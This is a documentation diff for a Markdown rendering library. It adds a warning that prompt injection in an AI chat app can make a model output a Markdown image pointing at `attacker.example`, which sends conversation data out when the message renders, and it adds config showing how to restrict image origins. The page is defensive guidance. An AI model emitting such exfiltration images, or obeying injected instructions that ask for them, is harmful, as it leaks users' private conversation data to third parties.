@@ -42,6 +42,10 @@ The default `rehype-sanitize` schema allows `http`, `https`, `irc`, `ircs`, `mai
 
 This works well for trusted content but should be tightened for untrusted sources.
 
+<Callout type="warning">
+  **Building an AI chat UI? Restrict image origins.** With the defaults, an image such as `![](https://attacker.example/p?d=...)` is requested by the browser as soon as the message renders, with no user action. If a model's context contains attacker-controlled text (a fetched web page, a tool result, a stored record), prompt injection can make it emit such an image with conversation data in the URL. Set `allowedImagePrefixes` to the origins you trust and `allowDataImages: false`, as shown in [Restricting Images](#restricting-images) and [Protecting Against Prompt Injection](#protecting-against-prompt-injection). Raw `<img>` tags are covered by the same `rehype-harden` setting, so you do not need to disable `rehype-raw` for this.
+</Callout>
+
 ## Restricting Protocols
 
 By default, all protocols are allowed. You can restrict which URL protocols are permitted:
@@ -156,10 +160,14 @@ Similarly, restrict which domains can serve images:
     [
       harden,
       {
+        // Required whenever allowedImagePrefixes or allowedLinkPrefixes is not "*"
+        defaultOrigin: 'https://your-app.com',
         allowedImagePrefixes: [
           'https://your-cdn.com',
           'https://trusted-images.com',
         ],
+        allowedLinkPrefixes: ['*'],
+        allowedProtocols: ['*'],
         allowDataImages: false,  // Disable base64 images
       },
     ],
@@ -168,6 +176,12 @@ Similarly, restrict which domains can serve images:
   {markdown}
 </Streamdown>
 ```
+
+Images whose URL does not start with one of the allowed prefixes are not rendered, so the browser never requests them. This applies to both Markdown images (`![](...)`) and raw `<img>` tags.
+
+<Callout type="info">
+  `rehype-harden` throws if `allowedImagePrefixes` or `allowedLinkPrefixes` is set to anything other than `["*"]` without a `defaultOrigin`.
+</Callout>
 
 ### Data Images
 
@@ -276,6 +290,8 @@ export default function Page() {
 ```
 
 Without `rehype-raw`, HTML tags will be escaped and displayed as text.
+
+Omitting `rehype-raw` does not restrict Markdown images (`![](...)`). To control where images can load from, configure `allowedImagePrefixes` on `rehype-harden` as described in [Restricting Images](#restricting-images).
 
 ## Relative URLs
 
